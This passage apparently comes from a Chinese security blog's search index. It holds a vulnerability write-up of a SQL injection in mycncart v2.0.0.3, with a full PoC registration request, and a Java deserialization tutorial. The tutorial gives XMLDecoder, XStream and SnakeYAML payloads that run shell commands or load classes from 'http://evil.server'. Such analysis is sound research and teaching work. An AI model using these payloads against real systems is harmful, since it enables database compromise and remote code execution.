mysql\u7684\u81ea\u5b9a\u4e49\u53d8\u91cf@\u7684\u5e94\u7528\uff0c\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u6d88\u9664\u7a7a\u683c\uff0c\u4ee5\u53ca\u6b63\u5219<code>\\bwhere\\b</code>\u7684\u7ed5\u8fc7 2. /!02222select*/\u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u662f\u7ecf\u5e38\u542c\u8bf4\uff0c\u4e5f\u5728\u8fd9\u91cc\u7528\u5230\u4e86\uff0c\u4e00\u4e2a\u5f88\u597d\u7684\u4f8b\u5b50\u3002 3. export_set\u7684\u5e94\u7528\uff0c\u6bd4\u8f83\u91cd\u8981\u7684\u5e94\u7528\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u53ef\u7528\u4e8e\u7ed5\u8fc7</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/mycncart-v2-0-0-3-sqli-20190225/","title":"mycncart v2.0.0.3 \u524d\u53f0\u6ce8\u5165","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/mycncart-v2-0-0-3-sqli-20190225/#cms","title":"CMS\u76f8\u5173\u4fe1\u606f","text":"<p>\u7248\u672c\uff1av2.0.0.3 \u6e90\u7801\u4e0b\u8f7d\uff1a mycncart\u4e3a\u4e2d\u56fd\u7248\u7684opencart\u7535\u5546\u7cfb\u7edf</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/mycncart-v2-0-0-3-sqli-20190225/#_1","title":"\u6f0f\u6d1e\u5206\u6790","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/mycncart-v2-0-0-3-sqli-20190225/#_2","title":"\u5148\u51b3\u6761\u4ef6\uff1a\u7f51\u7ad9\u5f00\u542f\u624b\u673a\u77ed\u4fe1\u529f\u80fd","text":"<p>\u4e00\u822c\u7684\u7535\u5546\u7cfb\u7edf\u90fd\u4f1a\u6709\u624b\u673a\u77ed\u4fe1\u9a8c\u8bc1\u7801\u529f\u80fd\uff0c\u6240\u4ee5mycncart\u63d0\u4f9b\u4e86\u8fd9\u4e2a\u63a5\u53e3\u3002\u9996\u5148\u5148\u5f00\u542f\u8be5\u529f\u80fd \u4f4d\u4e8e\u540e\u53f0&gt;\u6269\u5c55\u529f\u80fd&gt;\u6269\u5c55\u529f\u80fd\uff0c\u7b5b\u9009\u51fa\u77ed\u4fe1\u7f51\u5173\uff0c\u5e76\u5f00\u542f\uff0c\u5185\u5bb9\u53ef\u4ee5\u968f\u4fbf\u586b</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/mycncart-v2-0-0-3-sqli-20190225/#_3","title":"\u6e90\u7801\u5206\u6790","text":"<p>\u5148\u76f4\u63a5\u6765\u770b\u6f0f\u6d1e\u6210\u56e0\u5904 v2.0.0.3/catalog/model/account/smsmobile.php <pre><code>&lt;?php\nclass ModelAccountSmsMobile extends Model {\n\n  public function addSmsMobile($telephone, $verify_code) {\n    $this-&gt;db-&gt;query(\"INSERT INTO \" . DB_PREFIX . \"sms_mobile SET sms_mobile = '\" . $telephone . \"', verify_code = '\" . $verify_code . \"'\");\n\n  }\n\n  public function editSmsMobile($sms_mobile_id, $telephone, $verify_code) {\n    $this-&gt;db-&gt;query(\"UPDATE \" . DB_PREFIX . \"sms_mobile SET sms_mobile = '\" . $telephone . \"', verify_code = '\" . $verify_code . \"' WHERE sms_mobile_id = '\" . $sms_mobile_id . \"'\");\n\n  }\n\n  public function deleteSmsMobile($sms_mobile) {\n    $this-&gt;db-&gt;query(\"DELETE FROM \" . DB_PREFIX . \"sms_mobile WHERE sms_mobile = '\" . $sms_mobile . \"'\");\n  }\n\n  public function getIdBySmsMobile($sms_mobile) {\n    $query = $this-&gt;db-&gt;query(\"SELECT * FROM \" . DB_PREFIX . \"sms_mobile WHERE sms_mobile = '\" . $sms_mobile . \"'\");\n\n\n    return $query-&gt;row;\n  }\n\n  public function verifySmsCode($sms_mobile, $sms_code) {\n    $query = $this-&gt;db-&gt;query(\"SELECT COUNT(*) AS total FROM \" . DB_PREFIX . \"sms_mobile WHERE sms_mobile = '\" . $sms_mobile . \"' AND verify_code = '\" . $sms_code . \"'\");\n\n    return $query-&gt;row['total'];\n  }\n\n}\n</code></pre> \u8be5\u6587\u4ef6\u4e3amodel\u7c7b\uff0c\u5904\u7406\u77ed\u4fe1\u7684\u76f8\u5173\u6570\u636e\u5e93\u64cd\u4f5c\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u7684\u6240\u6709sql\u8bed\u53e5\u90fd\u662f\u6ca1\u6709\u8fdb\u884c\u5b89\u5168\u8fc7\u6ee4\u7684\uff0c\u76f4\u63a5\u5c31\u8fdb\u884c\u62fc\u63a5 \u6240\u4ee5\u5982\u679c\u4e0a\u5c42\u8c03\u7528\u4e0d\u5bf9\u6570\u636e\u505a\u5904\u7406\u7684\u8bdd\uff0c\u5c31\u80fd\u9020\u6210sql\u6ce8\u5165 \u6211\u8fd9\u91cc\u76f4\u63a5\u627e\u4e86verifySmsCode\u8fd9\u4e2a\u51fd\u6570\uff0c\u5728\u524d\u53f0\u5c31\u80fd\u8c03\u7528\u5230 \u5b9a\u4f4d\u5230v2.0.0.3/catalog/controller/account/register.php <pre><code>public function index() {\n      :\n      :\n    if (($this-&gt;request-&gt;server['REQUEST_METHOD'] == 'POST') &amp;&amp; $this-&gt;validate()) {\n      $customer_id = $this-&gt;model_account_customer-&gt;addCustomer($this-&gt;request-&gt;post, $weixin_login_openid, $weixin_login_unionid);\n      :\n      :\n    }\n  }\n</code></pre> \u7701\u7565\u65e0\u5173\u4ee3\u7801\uff0c\u5b9a\u4f4d\u5230validata()\u51fd\u6570 <pre><code>private function validate() {\n\n  if ($this-&gt;request-&gt;post['registertype'] == 'email') {\n    :\n    :\n  } else {\n\n    if ((utf8_strlen($this-&gt;request-&gt;post['telephone']) &lt; 3) || (utf8_strlen($this-&gt;request-&gt;post['telephone']) &gt; 32)) {\n      $this-&gt;error['telephone'] = $this-&gt;language-&gt;get('error_telephone');\n    }else{\n\n      if ($this-&gt;model_account_customer-&gt;getTotalCustomersByTelephone(trim($this-&gt;request-&gt;post['telephone']))) {\n        $this-&gt;error['telephone'] = $this-&gt;language-&gt;get('error_telephone_exists');\n      } else {\n\n        // if sms code is not correct\n        if ($this-&gt;config-&gt;get('sms_' . $this-&gt;config-&gt;get('config_sms') . '_status') &amp;&amp; in_array('register', (array)$this-&gt;config-&gt;get('config_sms_page'))) {\n          $this-&gt;load-&gt;model('account/smsmobile');\n          if($this-&gt;model_account_smsmobile-&gt;verifySmsCode($this-&gt;request-&gt;post['telephone'], $this-&gt;request-&gt;post['sms_code']) == 0) {\n            $this-&gt;error['sms_code'] = $this-&gt;language-&gt;get('error_sms_code');\n          }\n        }\n    :\n    :\n</code></pre> \u7b2c19\u884c\u5904\u8c03\u7528\u4e86verifySmsCode\u51fd\u6570\uff0c\u5176\u4e2d\u8f93\u5165\u4e3a<code>$this-&gt;request-&gt;post['telephone']</code>,\u800c\u4ece<code>v2.0.0.3/system/library/request.php</code>\u7684\u5b9a\u4e49\u53ef\u4ee5\u770b\u5230\uff0c\u8be5cms\u5bf9\u6570\u636e\u8f93\u5165\u53ea\u505a\u4e86<code>htmlspecialchars</code>\u5904\u7406\uff0c\u800c\u8fd9\u4e2a\u51fd\u6570\u9057\u6f0f\u4e86\u5355\u5f15\u53f7\u7684\u8f6c\u4e49\uff0c\u6240\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u5206\u6790\uff0cverifySmsCode\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u672a\u505a\u5230\u5b89\u5168\u7684\u5904\u7406\uff0c\u53ef\u4ee5\u5bfc\u81f4\u6ce8\u5165\u6f0f\u6d1e\u7684\u4ea7\u751f</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/mycncart-v2-0-0-3-sqli-20190225/#poc","title":"PoC","text":"<p>\u9020\u6210\u6570\u636e\u5e93\u9519\u8bef <pre><code>POST /index.php?route=account/register HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------7517053542655893771289640773\nContent-Length: 1491\nConnection: close\nCookie: OCSESSID=10ac6e7a3c082a8ce1a8facbbd; language=zh-cn; currency=CNY\nUpgrade-Insecure-Requests: 1\n\n-----------------------------7517053542655893771289640773\nContent-Disposition: form-data; name=\"registertype\"\n\nmobile\n-----------------------------7517053542655893771289640773\nContent-Disposition: form-data; name=\"email\"\n\n\n-----------------------------7517053542655893771289640773\nContent-Disposition: form-data; name=\"telephone\"\n\n534f3c824a9d63a8\n-----------------------------7517053542655893771289640773\nContent-Disposition: form-data; name=\"sms_code\"\n\n' or (select if(0,1,~0+1)) and ''='\n-----------------------------7517053542655893771289640773\nContent-Disposition: form-data; name=\"firstname\"\n\n123123\n-----------------------------7517053542655893771289640773\nContent-Disposition: form-data; name=\"lastname\"\n\n\n-----------------------------7517053542655893771289640773\nContent-Disposition: form-data; name=\"customer_group_id\"\n\n1\n-----------------------------7517053542655893771289640773\nContent-Disposition: form-data; name=\"password\"\n\n123123\n-----------------------------7517053542655893771289640773\nContent-Disposition: form-data; name=\"confirm\"\n\n123123\n-----------------------------7517053542655893771289640773\nContent-Disposition: form-data; name=\"newsletter\"\n\n0\n-----------------------------7517053542655893771289640773\nContent-Disposition: form-data; name=\"captcha\"\n\n4a6b2c\n-----------------------------7517053542655893771289640773\nContent-Disposition: form-data; name=\"agree\"\n\n1\n-----------------------------7517053542655893771289640773--\n</code></pre></p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/","title":"Java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398\u4e4bCommonsCollections1","text":"","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#0x00","title":"0x00 \u524d\u8a00","text":"<p>\u524d\u6bb5\u65f6\u95f4\u5728\u590d\u73b0shiro\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0\u65e0\u6cd5\u5f88\u597d\u7684\u7406\u89e3CommonCollections4\u4e3a\u4ec0\u4e48\u65e0\u6cd5\u6267\u884c\u547d\u4ee4\uff0c\u8fd8\u662f\u7f3a\u5c11Java\u7684\u4e00\u4e9b\u57fa\u7840\u77e5\u8bc6\u3002\u6240\u4ee5\u8fd9\u91cc\u5c31\u5148\u505c\u4e0b\u4e86\u590d\u73b0\u6f0f\u6d1e\u7684\u8fdb\u7a0b\uff0c\u5148\u5c06\u57fa\u7840\u6253\u624e\u5b9e\uff1a\uff09\u3002\u8fd9\u7bc7\u6587\u7ae0\u5c06\u8bb0\u5f55\uff0cJava\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u539f\u7406\u4ee5\u53ca\u6d4b\u8bd5\u73af\u5883\u3002</p> <p>\u53c2\u8003\u6587\u732e\u90fd\u5d4c\u5165\u5728\u6587\u4e2d\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#0x01","title":"0x01 \u57fa\u7840\u77e5\u8bc6","text":"","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#1-java","title":"1. Java\u4e2d\u7684\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316","text":"<p>\u5e8f\u5217\u5316\uff1a\u4f7f\u7528<code>ObjectOutputStream</code>\u7c7b\u7684<code>writeObject</code>\u51fd\u6570</p> <pre><code>public final void writeObject(Object x) throws IOException\n</code></pre> <p>\u53cd\u5e8f\u5217\u5316\uff1a\u4f7f\u7528<code>ObjectInputStream</code>\u7c7b\u7684<code>readObject</code>\u51fd\u6570</p> <pre><code>public final Object readObject() throws IOException, ClassNotFoundException\n</code></pre> <p>\u652f\u6301\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\u5fc5\u987b\u6ee1\u8db3\uff1a</p> <ol> <li>\u5b9e\u73b0\u4e86<code>java.io.Serializable</code>\u63a5\u53e3</li> <li>\u5f53\u524d\u5bf9\u8c61\u7684\u6240\u6709\u7c7b\u5c5e\u6027\u53ef\u5e8f\u5217\u5316\uff0c\u5982\u679c\u6709\u4e00\u4e2a\u5c5e\u6027\u4e0d\u60f3\u6216\u4e0d\u80fd\u88ab\u5e8f\u5217\u5316\uff0c\u5219\u9700\u8981\u6307\u5b9a<code>transient</code>\uff0c\u4f7f\u5f97\u8be5\u5c5e\u6027\u5c06\u4e0d\u4f1a\u88ab\u5e8f\u5217\u5316</li> </ol> <p>\u4e3e\u4e2a\u4f8b\u5b50(\u6765\u6e90\u4e8e\u6b64\u5904)</p> <pre><code>public class Employee implements java.io.Serializable\n{\n   public String name;\n   public String address;\n   public transient int SSN;\n   public int number;\n   public void mailCheck()\n   {\n      System.out.println(\"Mailing a check to \" + name\n                           + \" \" + address);\n   }\n}\n</code></pre> <pre><code>import java.io.*;\n\npublic class SerializeDemo\n{\n   public static void main(String [] args)\n   {\n      Employee e = new Employee();\n      e.name = \"Reyan Ali\";\n      e.address = \"Phokka Kuan, Ambehta Peer\";\n      e.SSN = 11122333;\n      e.number = 101;\n      try\n      {\n         FileOutputStream fileOut =\n         new FileOutputStream(\"/tmp/employee.ser\");\n         ObjectOutputStream out = new ObjectOutputStream(fileOut);\n         out.writeObject(e);\n         out.close();\n         fileOut.close();\n         System.out.printf(\"Serialized data is saved in /tmp/employee.ser\");\n      }catch(IOException i)\n      {\n          i.printStackTrace();\n      }\n   }\n}\n</code></pre> <p>\u8fd0\u884c\u540e\uff0c\u751f\u6210employee.ser</p> <p></p> <p>\u6839\u636e\u5e8f\u5217\u5316\u89c4\u8303\uff0c<code>aced</code>\u4ee3\u8868java\u5e8f\u5217\u5316\u6570\u636e\u7684magic word<code>STREAM_MAGIC</code>,<code>0005</code>\u8868\u793a\u7248\u672c\u53f7<code>STREAM_VERSION</code>,<code>73</code>\u8868\u793a\u662f\u4e00\u4e2a\u5bf9\u8c61<code>TC_OBJECT</code>,<code>72</code>\u8868\u793a\u8fd9\u4e2a\u5bf9\u8c61\u7684\u63cf\u8ff0<code>TC_CLASSDESC</code></p> <p>\u6240\u4ee5\u5728\u65e5\u5e38\u6d4b\u8bd5\u4e2d\uff0c\u5982\u679c\u89e3\u5f00\u7c7b\u4f3cBase64\u540e\uff0c\u8d77\u59cb\u4e3aaced\u6253\u5934\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528\u53cd\u5e8f\u5217\u5316\u7684payload\u3002</p> <p>\u5728\u5bf9\u5176\u505a\u5b8c\u5e8f\u5217\u5316\u64cd\u4f5c\u540e\uff0c\u6211\u4eec\u5728\u53e6\u4e00\u4e2aJVM\u4e2d\u6062\u590d\u8be5\u5bf9\u8c61\uff0c\u9700\u8981\u7528\u5230<code>ObjectInputStream</code></p> <pre><code>import java.io.*;\n\npublic class DeserializeDemo\n{\n   public static void main(String [] args)\n   {\n      Employee e = null;\n      try\n      {\n         FileInputStream fileIn = new FileInputStream(\"/tmp/employee.ser\");\n         ObjectInputStream in = new ObjectInputStream(fileIn);\n         e = (Employee) in.readObject();\n         in.close();\n         fileIn.close();\n      }catch(IOException i)\n      {\n         i.printStackTrace();\n         return;\n      }catch(ClassNotFoundException c)\n      {\n         System.out.println(\"Employee class not found\");\n         c.printStackTrace();\n         return;\n      }\n      System.out.println(\"Deserialized Employee...\");\n      System.out.println(\"Name: \" + e.name);\n      System.out.println(\"Address: \" + e.address);\n      System.out.println(\"SSN: \" + e.SSN);\n      System.out.println(\"Number: \" + e.number);\n    }\n}\n</code></pre> <p><code>readObject</code>\u51fd\u6570\u53cd\u5e8f\u5217\u5316\u4e86\u4e0a\u9762\u4ea7\u751f\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u6d41\uff0c\u751f\u6210\u4e86\u539f\u6709\u7684\u5bf9\u8c61\u6570\u636e\u7ed3\u6784\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8eSSN\u4e3atransient\uff0c\u5176\u65e0\u6cd5\u5e8f\u5217\u5316\uff0c\u6240\u4ee5\u8fd8\u539f\u540e\u5176\u503c\u4e3a0\u3002</p> <p>\u5982\u679c\u5728\u5f85\u5e8f\u5217\u5316\u7c7b\u4e0a\u5b9e\u73b0\u4e86readObject\u51fd\u6570\uff0c\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u4f1a\u81ea\u52a8\u8c03\u7528\u8be5\u7c7b\u7684readObject\u51fd\u6570\u3002</p> <p>\u4f8b\u5982\u5728Employee\u7c7b\u4e2d\u6dfb\u52a0\u51fd\u6570readObject</p> <pre><code>private void readObject(ObjectInputStream in) throws Exception {\n  in.defaultReadObject();\n  System.out.println(\"Employee call readObject Function\");\n}\n</code></pre> <p>\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u5c06\u8c03\u7528\u8be5\u51fd\u6570</p> <p></p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#2","title":"2. \u53cd\u5e8f\u5217\u5316\u89e6\u53d1\u70b9\u6269\u5c55","text":"<p>\u4e0a\u9762\u5c55\u793a\u4e86\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u539f\u7406\uff0c\u5e76\u4e14\u53cd\u5e8f\u5217\u5316\u7684\u89e6\u53d1\u70b9\u4e3a<code>ObjectInputStream.readObject</code>\u3002\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u662f\u5426Java\u53cd\u5e8f\u5217\u5316\u53ea\u80fd\u7531\u8be5\u70b9\u89e6\u53d1\uff1f\u7b54\u6848\u5f53\u7136\u662f\u5426\u5b9a\u7684\u3002</p> <p>\u9664\u4e86\u4e0a\u9762\u7684\u65b9\u6cd5\u5916\uff0c\u8fd8\u6709\u5982\u4e0b\u51e0\u79cd\u89e6\u53d1\u65b9\u5f0f\uff1a</p> <pre><code>ObjectInputStream.readObject// \u6d41\u8f6c\u5316\u4e3aObject\nObjectInputStream.readUnshared // \u6d41\u8f6c\u5316\u4e3aObject\nXMLDecoder.readObject // \u8bfb\u53d6xml\u8f6c\u5316\u4e3aObject\nYaml.load// yaml\u5b57\u7b26\u4e32\u8f6cObject\nXStream.fromXML// XStream\u7528\u4e8eJava Object\u4e0exml\u76f8\u4e92\u8f6c\u5316\nObjectMapper.readValue// jackson\u4e2d\u7684api\nJSON.parseObject// fastjson\u4e2d\u7684api\n</code></pre> <p>Note: \u5bf9\u4e8ereadUnshared\u51fd\u6570\uff0c\u5176\u4e0ereadObject\u51fd\u6570\u7684\u533a\u522b\u6682\u65f6\u8fd8\u6ca1\u5f04\u660e\u767d\uff0c\u5f15\u7528\u7f51\u4e0a\u7684\u89e3\u91ca</p> <p>readUnshared\u65b9\u6cd5\u8bfb\u53d6\u5bf9\u8c61\uff0c\u4e0d\u5141\u8bb8\u540e\u7eed\u7684readObject\u548creadUnshared\u8c03\u7528\u5f15\u7528\u8fd9\u6b21\u8c03\u7528\u53cd\u5e8f\u5217\u5316\u5f97\u5230\u7684\u5bf9\u8c61\uff0c\u800creadObject\u8bfb\u53d6\u7684\u5bf9\u8c61\u53ef\u4ee5\u3002</p> <p>\u4f46\u5176\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u4ecd\u7136\u53ef\u4ee5\u89e6\u53d1readObject\u7684\u8c03\u7528\uff0c\u6709\u5f85\u5f04\u6e05\u695a\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#3","title":"3. \u6269\u5c55\u89e6\u53d1\u70b9\u8bd5\u9a8c","text":"<p><code>readUnshared</code>\u51fd\u6570\u7684\u4f7f\u7528\u65b9\u5f0f\u540c<code>readObject</code>\u7c7b\u4f3c\uff0c\u8fd9\u91cc\u4e0d\u518d\u53d9\u8ff0\u3002\u8fd9\u4e00\u5c0f\u8282\u4e3b\u8981\u8bb2\u5404\u79cd\u89e6\u53d1\u70b9\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u4e0d\u8bb2\u5177\u4f53\u7684\u539f\u7406\u3002\u539f\u7406\u90e8\u5206\u7559\u5230\u540e\u9762\u5206\u6790\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#a-xmldecoderreadobject","title":"a. XMLDecoder.readObject","text":"<pre><code>public static void main(String[] args){\n  String poc = \"poc.xml\";\n  try {\n    FileInputStream file = new FileInputStream(poc);\n    XMLDecoder decoder = new XMLDecoder(file);\n    decoder.readObject();\n    decoder.close();\n  } catch (FileNotFoundException e) {\n    e.printStackTrace();\n  }\n}\n</code></pre> <p>poc.xml</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;java&gt;\n    &lt;object class=\"java.lang.ProcessBuilder\"&gt;\n        &lt;array class=\"java.lang.String\" length=\"3\"&gt;\n            &lt;void index=\"0\"&gt;\n                &lt;string&gt;/bin/sh&lt;/string&gt;\n            &lt;/void&gt;\n            &lt;void index=\"1\"&gt;\n                &lt;string&gt;-c&lt;/string&gt;\n            &lt;/void&gt;\n            &lt;void index=\"2\"&gt;\n                &lt;string&gt;open /Applications/Calculator.app&lt;/string&gt;\n            &lt;/void&gt;\n        &lt;/array&gt;\n        &lt;void method=\"start\"/&gt;\n    &lt;/object&gt;\n&lt;/java&gt;\n</code></pre> <p>\u6700\u7ec8\u53ef\u89e6\u53d1\u547d\u4ee4\u6267\u884c</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#b-yamlload","title":"b. Yaml.load","text":"<p>\u53c2\u8003\u94fe\u63a5\uff0c\u8fd9\u91cc\u6682\u672a\u8bd5\u9a8c</p> <p>\u6dfb\u52a0SnakeYAML\u5e93</p> <pre><code>&lt;!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.yaml&lt;/groupId&gt;\n    &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;\n    &lt;version&gt;1.25&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> <pre><code>public static void main(String[] args) {\n  String yamlStr = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n                   + \"[[!!java.net.URL [\\\"http://evil.server\\\"]]]]\";\n  Yaml yaml = new Yaml();\n  Object obj = yaml.load(yamlStr);\n}\n</code></pre> <p>\u8fd9\u91cc\u7684yamlStr\u53ef\u4ee5\u7528https://github.com/mbechler/marshalsec\u751f\u6210\u5371\u5bb3\u66f4\u5927\u7684payload</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#c-xstreamfromxml","title":"c. XStream.fromXML","text":"<p>\u53c2\u8003\u94fe\u63a5</p> <p>\u6dfb\u52a0XStream\u5e93</p> <pre><code>&lt;dependency&gt;\n  &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;\n  &lt;artifactId&gt;xstream&lt;/artifactId&gt;\n  &lt;version&gt;1.4.10&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> <pre><code>public static void main(String[] args) {\n//        expGen();\n        String payload = \"&lt;sorted-set&gt;\\n\" +\n                \"    &lt;string&gt;foo&lt;/string&gt;\\n\" +\n                \"    &lt;dynamic-proxy&gt;\\n\" +\n                \"    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\\n\" +\n                \"        &lt;handler class=\\\"java.beans.EventHandler\\\"&gt;\\n\" +\n                \"            &lt;target class=\\\"java.lang.ProcessBuilder\\\"&gt;\\n\" +\n                \"                &lt;command&gt;\\n\" +\n                \"                    &lt;string&gt;/bin/sh&lt;/string&gt;\\n\" +\n                \"                    &lt;string&gt;-c&lt;/string&gt;\\n\" +\n                \"                    &lt;string&gt;open /System/Applications/Calculator.app&lt;/string&gt;\\n\" +\n                \"                &lt;/command&gt;\\n\" +\n                \"            &lt;/target&gt;\\n\" +\n                \"     &lt;action&gt;start&lt;/action&gt;\"+\n                \"        &lt;/handler&gt;\\n\" +\n                \"    &lt;/dynamic-proxy&gt;\\n\" +\n                \"&lt;/sorted-set&gt;\\n\";\n        XStream xStream = new XStream();\n        xStream.fromXML(payload);\n    }\n</code></pre>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#d-67","title":"d. \u4e0a\u9762\u76846\u548c7\uff0c\u7559\u5230\u540e\u9762\u5206\u6790","text":"","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#4","title":"4. \u5c0f\u7ed3","text":"<p>\u4e0a\u9762\u4e24\u8282\u4ecb\u7ecd\u4e86Java\u53cd\u5e8f\u5217\u5316\u7684\u539f\u7406\uff0c\u5e76\u6269\u5c55\u4e86\u53cd\u5e8f\u5217\u5316\u7684\u89e6\u53d1\u70b9\u3002\u5728\u5b9e\u9645\u7684\u5ba1\u8ba1\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u4ee5\u76f4\u63a5\u5173\u6ce8\u8fd9\u4e9b\u51fd\u6570\u7684\u8c03\u7528</p> <pre><code>(readObject|readUnshared|load|fromXML|readValue|parseObject)\\s*\\(\n</code></pre> <p>\u5f53\u7136\u6709\u4e9b\u8fd8\u9700\u8981\u770b\u662f\u5426\u662f\u6709\u6f0f\u6d1e\u7684\u7248\u672c</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#0x02","title":"0x02 \u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b","text":"<p>\u4e0a\u9762\u5927\u81f4\u8bb2\u8bc9\u4e86\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u4f7f\u7528\u65b9\u6cd5\uff0c\u672c\u8282\u5c06\u8c03\u8bd5\u4e0a\u9762\u7684<code>Employee</code>\u6848\u4f8b\uff0c\u6765\u770b\u770b\u5728\u4ee3\u7801\u5c42\u9762\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u662f\u600e\u4e48\u6837\u7684\uff01</p> <p>\u8fd9\u91cc\u4f7f\u7528\u7684\u662f<code>ObjectInputStream</code>\u7684\u53cd\u5e8f\u5217\u5316\u65b9\u6cd5<code>readObject</code>\u51fd\u6570</p> <p>\u5176\u5b9e\u6574\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u603b\u4f53\u6765\u8bf4\u5206\u4e3a\u4e24\u6b65\uff0c\u4ece\u5b57\u7b26\u4e32\u6d41\u4e2d\u6839\u636e\u5e8f\u5217\u5316\u89c4\u683c\u63d0\u53d6\u51fa\u53ef\u80fd\u7684\u7c7b\uff0c\u7136\u540e\u5c06\u8be5\u7c7b\u4f7f\u7528\u53cd\u5c04\u673a\u5236\u67e5\u627e\u6216\u521b\u5efa\u4e00\u4e2a\u5b9e\u4f8b\u3002\u5176\u4e2d\u4e5f\u4f1a\u6709\u4e00\u4e9b\u68c0\u67e5\u7684\u8fc7\u7a0b\uff0c\u8fd9\u91cc\u4f8b\u5b50\u6bd4\u8f83\u7b80\u5355\uff0c\u4e0d\u53d9\u8ff0\u3002</p> <p>\u6765\u770b\u4e00\u4e0b\u67e5\u627e\u6216\u521b\u5efa\u7684\u8fc7\u7a0b</p> <p><code>ObjectInputStream:readObject:417</code></p> <p></p> <p>\u8ddf\u8fdbObjectInputStream\u7684readObject\u7c7b\uff0c\u8be5\u51fd\u6570\u4f53\u73b0\u4e86\u6574\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\uff0c\u5176\u4e2d\u5176\u4e3b\u8981\u529f\u80fd\u7684\u662f<code>readObject0</code>\u51fd\u6570</p> <p><code>ObjectInputStream:readObject0:1515</code></p> <p></p> <p>\u4ece\u6d41\u4e2d\u8bfb\u53d6\u51fa\u5f53\u524d\u7684\u7c7b\u578b\uff0c<code>tc=115</code>\u6b64\u65f6\u4ee3\u8868Object\u5bf9\u8c61\uff0c\u4ece\u800c\u8fdb\u5165<code>readOrdinaryObject</code></p> <p><code>ObjectInputStream:readOrdinaryObject:2026</code></p> <p></p> <p>\u8be5\u51fd\u6570\u4e3b\u8981\u505a\u4e86\u5b9e\u4f8b\u5316\u5bf9\u8c61\u7684\u5de5\u4f5c\uff0c\u5176\u4e2d2033\u884c\u751f\u6210\u7684ObjectStreamClass\u5bf9\u8c61\uff0c\u4f1a\u5229\u7528\u53cd\u5c04\u673a\u5236\u5b9e\u4f8b\u5316\u5e8f\u5217\u5316\u6d41\u4e2d\u7684\u5bf9\u8c61\u30022044\u884c\u5b9e\u9645\u7684\u83b7\u53d6\u5230\u8be5\u5bf9\u8c61\u3002</p> 